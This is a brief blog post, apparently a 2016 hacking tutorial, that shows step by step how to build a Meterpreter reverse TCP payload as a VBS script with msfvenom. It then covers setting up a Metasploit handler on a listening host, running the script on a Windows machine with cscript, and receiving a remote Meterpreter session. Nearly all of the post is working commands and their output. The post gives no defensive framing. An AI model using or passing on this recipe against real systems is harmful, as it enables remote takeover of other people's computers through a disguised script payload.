---
title: Metasploit Reverse Shell via CMD
date: 2016-11-01 22:06:22
tags: Metasploit
---

### 0x01 Generate vbs
```
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win > test.vbs

No encoder or badchars specified, outputting raw payload
Payload size: 354 bytes
Final size of vbs file: 7384 bytes
```
### 0x02 Metasploit listen
```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.0.103
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.0.103:4444
[*] Starting the payload handler...
```

### 0x03 Windows run vbs
```
C:\Documents and Settings\Administrator>cscript.exe ./test.vbs

Microsoft (R) Windows Script Host Version 5.6
版权所有(C) Microsoft Corporation 1996-2001。保留所有权利。
```

### 0x04 Metasploit item2
```
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.0.103:4444
[*] Starting the payload handler...
[*] Sending stage (983599 bytes) to 192.168.0.103
[*] Meterpreter session 1 opened (192.168.0.103:4444 -> 192.168.0.103:49778) at 2016-11-01 22:16:44 +0800

meterpreter >
```
